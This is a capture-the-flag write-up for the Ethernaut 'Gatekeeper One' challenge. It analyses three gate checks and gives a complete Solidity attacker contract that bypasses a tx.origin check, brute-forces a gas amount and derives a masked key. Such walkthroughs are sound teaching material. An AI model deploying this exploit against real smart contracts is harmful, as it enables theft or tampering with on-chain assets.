---
layout: writeup
title: "Gatekeeper One"
level: "Hard"
category: "Ethernaut"
description: "Pass three complex security gates involving tx.origin, precise gas calculation, and bitwise masking."
---

## Analysis

* **Gate 1:** Requires `msg.sender != tx.origin`. This is bypassed by using an attacker contract.
* **Gate 2:** Requires `gasleft() % 8191 == 0`. This is the hardest part; you must provide a precise amount of gas so that when the execution reaches this line, the remaining gas is a multiple of 8191.
* **Gate 3:** Requires specific bitwise equalities between a `bytes8` key and `tx.origin`.

[Image of Solidity bitwise masking and data type casting logic]

**Gate 3 Logic Breakdown:**
1. `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`
2. `uint32(uint64(_gateKey)) != uint64(_gateKey)`
3. `uint32(uint64(_gateKey)) == uint16(uint16(tx.origin))`

---

## Solution

The key is derived from your `tx.origin` address using a mask: `tx.origin & 0xFFFFFFFF0000FFFF`. To solve Gate 2, we use a brute-force loop in a script to find the exact gas offset.

---

**Attacker Contract (Solidity):**

<pre class="plain-code"><code>
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface IGateKeeperOne{
    function enter(bytes8 _gatekey) external returns(bool);
}
contract AttackGateOne{
    IGateKeeperOne public target;
    constructor( address _target){
        target=IGateKeeperOne(_target);
    }
    function attack() external{
        bytes8 gatekey =bytes8(uint64(uint160(tx.origin))& 0xFFFFFFFF0000FFFF);
        for(uint256 i=0;i<8191;i++){
            uint256 gasToTry =8191 * 10 + i;
            (bool ok,)=address(target).call{gas: gasToTry}(abi.encodeWithSignature("enter(bytes8)",gatekey));
            if(ok){
                break;
            }
        }
    }
}
</code></pre>

---